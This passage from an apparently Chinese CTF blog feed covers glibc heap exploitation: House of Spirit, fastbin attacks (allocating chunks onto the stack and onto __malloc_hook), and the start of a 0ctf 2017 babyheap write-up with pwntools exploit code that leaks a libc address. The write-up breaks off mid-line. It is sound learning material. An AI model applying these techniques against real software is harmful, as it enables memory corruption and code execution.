%p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后的效果如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  pwner ./house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake <span class="string">&#x27;fastbin&#x27;</span> region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7fffffffdc08 and the second at 0x7fffffffdc48.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) <span class="keyword">while</span> still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free <span class="keyword">for</span> fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work <span class="keyword">for</span> the malloc parameter at the end.</span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default <span class="keyword">for</span> the main arena) to pass the nextsize integrity checks. No need <span class="keyword">for</span> fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffdc08.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will <span class="built_in">return</span> the region of our fake chunk at 0x7fffffffdc08, <span class="built_in">which</span> will be 0x7fffffffdc10!</span><br><span class="line">malloc(0x30): 0x7fffffffdc10</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>伪造堆块: 在可控的两个堆块构造好数据，将它伪造成一个fastbin</li><li>覆盖堆指针指向上一步伪造的堆块</li><li>释放堆块，将伪造的堆块释放入fastbin的单链表里面</li><li>申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的</li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><p>[l-ctf2016–pwn200]</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.x10sec.org/pwn/heap/fastbin_attack/">CTF Wiki Fastbin Attack</a></p><p><a href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastbin Attack</title>
      <link href="/note-pwn-fastbin-attack/"/>
      <url>/note-pwn-fastbin-attack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/">CTF Wiki Fastbin Attack</a>, 根据学习情况略有补充和修改</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法,是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话,可以做如下的分类：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中,前两种主要漏洞侧重于利用 <code>free</code> 函数释放 <strong>真的 chunk 或伪造的 chunk</strong>, 然后再次申请 chunk 进行攻击,后两种侧重于故意修改 <code>fd</code> 指针,直接利用 <code>malloc</code> 申请指定位置 <code>chunk</code> 进行攻击</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的,并且由 fastbin 管理的 chunk 即使被释放,其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p><p>一个例子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    chunk3=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">//进行释放</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放前</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>执行三次 free 进行释放后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2</span><br><span class="line">0x602050:   0x0000000000602000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3</span><br><span class="line">0x602090:   0x0000000000602040  0x0000000000000000</span><br><span class="line">0x6020a0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针,并且 chunk 3、2、1构成了一个单链表</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x602080 —▸ 0x602040 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p><a href="https://lantern.cool/note-pwn-double-free/">Fastbin Double Free</a></p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p><a href="https://lantern.cool/note-pwn-house-of-spirit/">House of Spirit</a></p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术,那么理解该技术就已经不成问题了,它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针,把 fd 指针指向我们想要分配的栈上,从而实现控制栈中的一些关键数据,比如返回地址等。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk,同时劫持了 fastbin 链表中 chunk 的 fd 值,通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK, *PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size = <span class="number">0x21</span>;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_chunk address: %p\n&quot;</span>, &amp;stack_chunk);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 address: %p\n&quot;</span>, chunk1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)chunk1 = &amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_a address: %p\n&quot;</span>, chunk_a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行结果如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work ./alloc_to_stack</span><br><span class="line">stack_chunk address: 0x7fffffffdc60</span><br><span class="line">chunk1 address: 0x555555756260</span><br><span class="line">chunk_a address: 0x7fffffffdc60</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中,从而控制返回地址等关键数据。要实现这一点我们需要劫持fastbin 中 chunk 的 fd 域,把它指到栈上,当然同时需要栈上存在有满足条件的size值</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的,唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的,还是自然存在的都无妨）,我们可以把 chunk 分配到任意的可写内存中,比如bss、heap、data、stack等等。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>在这个例子,我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook的位置,相当于覆盖_malloc_hook来控制程序流程**。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk1 = <span class="number">0x7ffff7dcfc30</span> - <span class="number">0x3</span>;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    chunk_a = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_a address: %p&quot;</span>, chunk_a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 0x7ffff7dcfc30 根据本机调试得, 这个值的获得首先需要我们观察欲写入地址附近是否存在可以字节错位的情况。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16gx &amp;__malloc_hook - 0x8</span><br><span class="line">0x7ffff7dcfbf0 &lt;_IO_wide_data_0+272&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dcfc00 &lt;_IO_wide_data_0+288&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7ffff7dcfc10 &lt;_IO_wide_data_0+304&gt;:   0x00007ffff7dcbd60      0x0000000000000000</span><br><span class="line">0x7ffff7dcfc20 &lt;__memalign_hook&gt;:       0x00007ffff7a7b480      0x00007ffff7a7c800</span><br><span class="line">0x7ffff7dcfc30 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>0x7ffff7dcfc30 是我们想要控制的 __malloc_hook 的地址,于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的,因此 fastbin 的范围为 32 字节到 128 字节(0x20-0x80),如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这里的size指用户区域,因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>通过观察发现 0x7ffff7dcfc2d 处可以实现错位构造一个 0x000000000000007f</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/16b 0x7ffff7dcfc30 - 0x3</span><br><span class="line">0x7ffff7dcfc2d &lt;__realloc_hook+5&gt;:      0x7f    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x7ffff7dcfc35 &lt;__malloc_hook+5&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时,是属于 index 5 的,即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line"><span class="meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure><p>（注意sz的大小是unsigned int,因此只占4个字节）</p><p>而其大小又包含了 0x10 的 chunk_header,因此我们选择分配 0x60 的 fastbin,将其加入链表。</p><p>最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dcfc2d,因此我们就可以直接控制 malloc_hook 的内容(在我的libc中 realloc_hook 与__malloc_hook 是在连在一起的)。</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fastbin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf 2017 babyheap</title>
      <link href="/wp-item-0ctf-2017-babyheap/"/>
      <url>/wp-item-0ctf-2017-babyheap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#babyheap_0ctf_2017">BUUCTF babyheap_0ctf_2017</a></p><ul><li>libc version: 2.23</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work ./libc.so.6</span><br><span class="line">GNU C Library (GNU libc) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.</span><br><span class="line">There is NO warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/libc/bugs.html&gt;.</span><br></pre></td></tr></table></figure><ul><li><code>checksec babyheap_0ctf_2017</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  work checksec babyheap_0ctf_2017</span><br><span class="line">[*] <span class="string">&#x27;/ctf/work/babyheap_0ctf_2017&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>保护全开</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要结构体如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x18, mappedto_6)</span><br><span class="line">00000000 inuse           dd ?</span><br><span class="line">00000004 padding         dd ?</span><br><span class="line">00000008 size            dq ?</span><br><span class="line">00000010 content         dq ?                    ; offset</span><br><span class="line">00000018 node            ends</span><br></pre></td></tr></table></figure><p>题目主要有四个功能</p><ul><li>allocate: 新建一个node, 只建不写</li><li>fill: 往 node 中写入数据</li><li>free: 释放 node</li><li>Dump: 输出 node 内容</li></ul><p>其漏洞点在于调用<code>fill</code>函数时是重新输入 size, 使得存在堆溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">Fill</span><span class="params">(node *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 size; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size_1; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  size = read_int();</span><br><span class="line">  v2 = size;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)size &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1[(<span class="keyword">signed</span> <span class="keyword">int</span>)size].inuse;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)size == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      size = read_int();</span><br><span class="line">      size_1 = size;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        size = sub_11B2((__int64)a1[v2].content, size_1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li><p>创建四个堆块(0, 1, 2, 3), chunk3 防止释放 chunk2 后 chunk2 被 Top chunk 合并</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>此时堆布局</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580f0</span><br><span class="line">Size: 0x20f11</span><br></pre></td></tr></table></figure></li><li><p>通过 fill chunk0 进行堆溢出, 修改 chunk1 的 size 域进行 chunk extend, 使得释放 chunk1 后重新 malloc 回来后, chunk1 包含 chunk2 的头部</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x0</span>) * <span class="number">3</span> + p64(<span class="number">0x41</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x71</span>)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br></pre></td></tr></table></figure><p>  0x71 用于补全结构, 此时堆布局</p><p>  此时堆布局:</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580f0</span><br><span class="line">Size: 0x20f11</span><br></pre></td></tr></table></figure></li><li><p>可以看到 chunk1 的 size 域被修改为 0x41, 但是在 node_list 中的 size 并非 0x41, 因此要 free 后重新 malloc 回来</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x30</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br></pre></td></tr></table></figure><p>  此时 chunk1 内容:</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x555555758020</span><br><span class="line">0x555555758020: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x555555758030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>  此时 chunk2 的头部被清空了, 因此需要填充回来</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fill(1, len(payload), payload)</span><br></pre></td></tr></table></figure></li><li><p>这时释放 chunk2, 被 unsorted bin 回收. 这时输出 chunk1 内容就可以知道 main_arena+0x58 的地址, 根据 main_arena address 和 libc base address的偏移固定，因此可以计算出 libc base address</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>  free 后 chunk1 内容</p>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/8gx 0x555555758020</span><br><span class="line">0x555555758020: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x555555758030: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000      0x0000000000000091</span><br><span class="line">0x555555758050: 0x00007ffff7dd4b78      0x00007ffff7dd4b78</span><br></pre></td></tr></table></figure>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;\x91&quot;</span> + <span class="string">&#x27;\x00&#x27;</span> * <span class="number">7</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak_addr: %s&quot;</span> % <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc.address = leak_addr - <span class="number">0x39bb78</span></span><br><span class="line">malloc_hook = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address: %s&quot;</span> % <span class="built_in">hex</span>(libc.address))</span><br><span class="line">log.success(<span class="string">&quot;__malloc_hook address: %s&quot;</span> % <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one_gadget = libc.address  + one[<span 